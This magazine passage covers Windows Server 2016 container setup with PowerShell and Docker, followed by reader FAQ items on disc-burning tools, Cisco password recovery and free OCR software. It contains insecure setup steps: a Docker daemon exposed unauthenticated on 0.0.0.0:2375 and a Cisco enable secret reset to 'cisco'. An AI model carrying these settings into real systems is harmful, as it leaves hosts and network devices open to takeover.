скрипт, позволяющий установить все зависимости автоматически и настро-
ить хост. При желании можно воспользоваться им. Параметры внутри скрипта
помогут понять все механизмы:

PS> https://aka.ms/tp4/Install-ContainerHost
    -OutFile C:\Install-ContainerHost.ps1
PS> C:\Install-ContainerHost.ps1

Есть еще один вариант — развернуть готовую виртуальную машину с под-
держкой контейнера. Для этого на том же ресурсе есть скрипт, автоматиче-
ски производящий все нужные операции. Подробная инструкция приведена
на MSDN. Скачиваем и запускаем скрипт:

PS> wget -uri https://aka.ms/tp4/New-ContainerHost
    -OutFile c:\New-ContainerHost.ps1
PS> C:\New-ContainerHost.ps1 –VmName WinContainer
    -WindowsImage ServerDatacenterCore
Готовим контейнер

Имя задаем произвольное, а -WindowsImage говорит о типе собираемо-
го образа. Вариантами могут быть NanoServer, ServerDatacenter. Сразу ста-
вится и Docker, за его отсутствие или наличие отвечает параметр SkipDocker
и IncludeDocker. После запуска начнется загрузка и преобразование образа,
в процессе нужно будет указать пароль для входа в VM. Сам ISO-файл до-
статочно большой, почти 5 Гбайт. Если канал медленный, файл можно скачать
на другом компьютере, после чего переименовать в WindowsServerTP4 и ско-
пировать в С:\Users\Public\Documents\Hyper-V\Virtual Hard Disks. Можем
залогиниться в установленную виртуальную машину, указав пароль, заданный
при сборке, и работать.
   Теперь можно переходить непосредственно к использованию контейнеров.

ИСПОЛЬЗОВАНИЕ КОНТЕЙНЕРОВ С POWERSHELL
Модуль Containers содержит 32 командлета PowerShell, документация по не-
которым еще неполная, хотя, в общем, чтобы заставить все работать, доста-
точная. Перечень вывести просто:

PS> Get-Command -module Containers
Список командлетов модуля Containers

Получить список доступных образов можно при помощи командлета Get-
ContainerImage, контейнеров — Get-Container. В случае с контейнером в колон-
ке Status будет показан его текущий статус: остановлен или запущен. Но пока
технология находится в стадии разработки, MS не представила репозиторий,
да и, как говорилось, пока PowerShell работает с локальным репозиторием,
поэтому для экспериментов его придется создать самому.
   Итак, сервер с поддержкой у нас есть, теперь нужны сами контейнеры.
Для этого ставим провайдер пакетов ContainerProvider.

PS> Install-PackageProvider ContainerProvider -Force

Смотрим список доступных в OneGet образов.

PS> Find-ContainerImage

Выбираем и ставим нужный.

PS> Install-ContainerImage -Name WindowsServerCore
Устанавливаем контейнер на локальный сервер

Проверяем, что образ действительно находится в локальном репозитории:

PS> Get-ContainerImage
Name Publisher Version IsOSImage
---- --------- ------- ---------
WindowsServerCore CN=Microsoft 10.0.10586.0        True

Для создания контейнера из образа нужно указать его имя, исходный образ
и имя Virtual Switch:

PS> New-Container -Name “WindowsCore”
    -ContainerImageName “WindowsServerCore” -SwitchName External

В результате в ОС появляются файлы, содержащие описание нового кон-
тейнера. Дополнительно можно указать максимальный размер памяти, акка-
унт для доступа, версию, издателя, путь, где создать контейнер, и так далее.
Можем проверить его наличие при помощи Get-Container. И запускаем:

PS> Start-Container “WindowsCore”

В этот момент контейнеру выделяются ресурсы, и, в отличие от виртуальной
машины, контейнер стартует практически мгновенно. Остановка производит-
ся при помощи командлета Stop-Container.
   Подключаемся при помощи PowerShell remoting:

PS> Enter-PSSession -ContainerName WindowsCore -RunAsAdministrator

Теперь можем выполнить любые действия как с обычной виртуальной маши-
ной. Например, установить новую роль:

PS> Install-WindowsFeature web-server
Чтобы сохранить установки, на основе контейнера можем создать образ.
При этом система автоматически регистрирует зависимости между новым
и базовым образом:

PS> New-ContainerImage -Name “WindowsIIS”
    -ContainerImageName “WindowsCore”

Можем проверить данные об образе — имя и родительский образ:

PS> Get-ContainerImage | select Name, ParentImage

Если теперь запустить образ WindowsIIS и проверить установленные службы,
то увидим наличие IIS.

ДОПОЛНИТЕЛЬНЫЕ ОПЕРАЦИИ
Для изменения настроек параметров контейнера предложен целый набор ко-
мандлетов Add-Container* и Set-Container*, назначение большинства понятно
из названия.
  Добавим сетевой адаптер внутрь контейнера, подключим его к созданному
ранее Virtual Switch и активируем соединение:

PS> Add-ContainerNetworkAdapter -ContainerName “WindowsIIS”
    -SwitchName “External”
PS> Connect-ContainerNetworkAdapter -ContainerName “WindowsIIS”
    -SwitchName “External”

Так же просто создаются общие папки между контейнером и сервером. Доба-
вим в контейнере новый каталог:

PS> New-Item -Type Directory С:\share

Затем создаем новую общую папку, выполнив на сервере

PS> Add-ContainerSharedFolder -ContainerName “WindowsIIS”
    -SourcePath c:\share -DestinationPath c:\share\WindowsIIS

После этого необходимо перезапустить контейнер.

ИСПОЛЬЗОВАНИЕ DOCKER
Как уже говорилось, кроме PowerShell, для управления контейнерами могут
быть использованы утилиты Docker. С точки зрения унификации это большой
плюс: тем, кто раньше работал с Docker, не нужно изучать новые инструменты.
Docker не устанавливается при развертывании на хосте контейнеров, это нуж-
но сделать самому или использовать скрипты New-ContainerHost или Install-
ContainerHost, о которых говорилось выше. В процессе потребуется устано-
вить клиент и запустить демон Docker с нужными параметрами. Возможно,
в будущем процесс упростится и нужный пакет появится в OneGet. Пока в нем
находится лишь пакет posh-docker, реализующий автодополнение команд
Docker в командной строке PowerShell:

PS> Install-Module -Name posh-docker

Разработчики предлагают свой вариант установки и настройки Docker, пред-
полагающий использование NSSM, по ссылке есть все команды и скрипт. Для
тестирования можно поступить проще. Скачиваем docker.exe и помещаем
в каталог system32:

PS> wget https://aka.ms/tp4/docker
    -OutFile $env:SystemRoot\system32\docker.exe

Запускаем службу Docker, не забыв открыть в файрволе стандартный для Docker
2375-й порт:

PS> Start-Process cmd “/k docker daemon -D -b External
    -H 0.0.0.0:2375”

Теперь можем работать как с обычным Docker, только в Windows. Смотрим спи-
сок доступных локальных образов:

PS> docker images

Должны увидеть установленные при помощи PowerShell образы, можем их ис-
пользовать. Но также есть готовые образы и в репозитории Docker:

PS> docker search microsoft

Запускаем нужный:

PS> docker run -it --name demo microsoft/nano-iis cmd

Получаем в результате доступ к командной строке. Выполняем все настройки,
выходим и сохраняем результат в образ:
C:\> exit
PS> docker commit demo windowsiis





Ищем образ в репозитории Docker

ВЫВОД
Возможность запускать приложения в безопасной изолированной среде
без увеличения нагрузки на ОС — несомненно, большой плюс новой версии
Windows Server 2016. Поэтому новая фича будет востребована при разверты-
вании и масштабировании сервисов среди разработчиков. Остается дождать-
ся окончательного релиза.
FAQ



                                        Алексей Zemond
                                           Панкратов
                                           3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)
ВЫБИРАЕМ УТИЛИТУ ДЛЯ ЗАПИСИ ЗАГРУЗОЧНЫХ ДИСКОВ
И ФЛЭШЕК
Мы живем в просвещенные времена флэш-накопителей и вездесущего интер-
нета. Но иногда всё же приходится нарезать болванку-другую — к примеру,
для создания загрузочного диска. А для этого хорошо иметь удобное и надеж-
ное средство. И, в случае с Windows, выбирать есть из чего.
   Все, конечно, знают про Nero Burning Rom, но за годы существования эта
программа превратилась в настоящего монстра. Помимо записи образов она
предлагает ещё тьму разных дополнительных экзотических фич и опций, раз-
ве что не поет и не пляшет. Поэтому посмотрим на более легковесные и к тому
же совершенно бесплатные программы.
   Утилита freeisoburner — как раз такая программа. Даже по скриншотам вид-
но, что проще не бывает. Впрочем, разве для успешного прожига нужно что-то





                Freeisoburn
еще? Помимо всех стандартных видов дисков (CD, DVD, «плюс» и «минус» R и
RW) тулза поддерживает HD DVD и Blu-ray.
  При объеме 800 Кб — однозначно круто. Но бывает ещё меньше — scdwriter
занимает 396 Кб и не только записывает образы на компакт-диск, но и совер-
шает обратную операцию





scdwriter
во всей своей
красе


Если цель — записать образ именно на флэшку, то в этом деле лучше всего
поможет unetbootin.
Unetbootin

Работает она на любой платформе, будь то Windows, Linux или OS X. Не требу-
ет установки и, помимо прочего, предлагает готовый набор загрузочных обра-
зов, которые в автоматическом режиме скачивает из интернета. Список, кста-
ти, весьма внушительный и от версии к версии дополняется и обновляется.


ВОССТАНАВЛИВАЕМ ЗАБЫТЫЙ ПАРОЛЬ
К КОММУТАТОРУ CISCO
Чаще всего так бывает в самый неудачный момент: что-то сломалось или что-
то нужно поправить, и тут раз — оказывается, что пароль неверен. Когда от-
чаешься пробрутфорсить вручную собственный пароль, можешь переходить
к плану «Б» — сбросу.
   У Cisco на каждое сетевое устройство имеется подробная документация
по восстановлению пароля. Но есть и общие рецепты. Для сброса пароля на
маршрутизаторе достаточно будет проделать следующие действия:
1. перезагрузить устройство;
2. нажать комбинацию клавиш Ctrl + Break в первые 20-40 секунд загрузки.

  Далее выполняем команды в консоли:

rommon>confreg 0x2142
rommon>i
router>en
router#copy start run
router#conf t
router(conf)#enable secret cisco
router(conf)#config-register 0x2102
router(conf)#int fa0/0
router(conf-if)#no shutdown
router(conf-if)#end
router#copy run start

Сброс пароля на коммутаторах немного отличается:
1.  при нажатой кнопке выбора режима (mode) вставить шнур питания (не отпускать
  кнопку до тех пор, пока индикатор над портом 1 не будет гореть как минимум две се-
  кунды);
3. ввести команды:

flash_init
load_helper

4. переименовать файл config.text:

rename flash:config.text flash:config.old
boot

5. отказаться от входа в режим настройки;
6. перейти в пользовательский режим;
7. перейти в привилегированный режим;
8. вернуть имя ранее переименованному файлу:

rename flash:config.old flash:config.text

9. загрузить в running-config конфигурационный файл:

copy startup run
10. перейти в конфигурационный режим:

conf t

11. изменить пароль;
12. сохранить конфигурацию:

copy run startup

Такими нехитрыми манипуляциями можно сбросить пароль на различных ком-
мутаторах и маршрутизаторах Cisco. Главное — после всех этих действий
не забыть его вновь, а то одно дело, когда девайс стоит от тебя через стену,
а совсем другое — когда на другом конце страны.


ПОДБИРАЕМ ЗАМЕНУ ДЛЯ FINE READER
Fine Reader — замечательное средство распознавания текстов, но если пла-
тить за него ты не хочешь, а текст распознать надо, то, возможно, сгодится
одна из бесплатных альтернатив.
  Начнем с онлайновых сервисов. Free Online OCR — неплохой вариант. Он
«ест» картинки, PDF и DjVu, поддерживает огромное количество языков и ра-
ботает с архивами ZIP. Когда под рукой нет ничего другого — очень удобный
инструмент.

                                                                    Free Online OCR
Ещё один неплохой сервис называется img2txt. Главный минус — ограничение
загружаемых файлов по объему. Впрочем, четырех мегабайтов вполне хватит
для разового распознавания текста с картинки.





img2txt

Из программ можно посоветовать CuneiForm. Он далеко не новый, но
со своими задачами справляется. Из полезных функций — возможность вруч-
ную задать область распознавания.

                                                                                    Cunei-
                                                                   Form
Неплохим вариантом мог бы стать SimpleOCR, но, к сожалению, он не под-
держивает русский язык, а когда испытывает сложности с распознаванием,
постоянно предлагает скачать платную версию.
   Кстати, из платных программ рекомендую глянуть Readiris Pro, благо есть и
пробная версия. Это простая и легковесная программа в сравнении с тем же
Fine Reader, но весьма эффективная.





Readiris Pro
                                    18+





  № 3 (206)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                                Анна Королькова            Алик Вайнер
                                      Верстальщик                 Обложка
                                  цифровой версии


                           РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                  Подробная информация по подписке shop.glc.ru, info@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016